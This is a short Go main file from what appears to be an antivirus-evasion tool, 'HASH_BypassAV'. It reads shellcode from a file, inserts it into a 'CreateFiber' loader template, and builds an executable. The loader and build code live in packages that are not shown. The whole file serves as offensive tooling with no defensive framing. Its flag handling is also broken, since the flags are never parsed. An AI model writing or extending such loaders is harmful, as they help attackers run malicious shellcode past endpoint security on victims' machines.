package main

import (
	"HASH_BypassAV/build"
	"HASH_BypassAV/parser"
	"flag"
)

func main() {

	var (
		c_2_shellcode  bool
		shellcode_path string
	)

	flag.StringVar(&shellcode_path, "s", "shellcode.txt", "")
	flag.BoolVar(&c_2_shellcode, "c", false, "")

	shellcode := parser.ParseShellCode(shellcode_path)
	code := parser.GetFinalCode("CreateFiber", shellcode)

	build.Build(code)
}
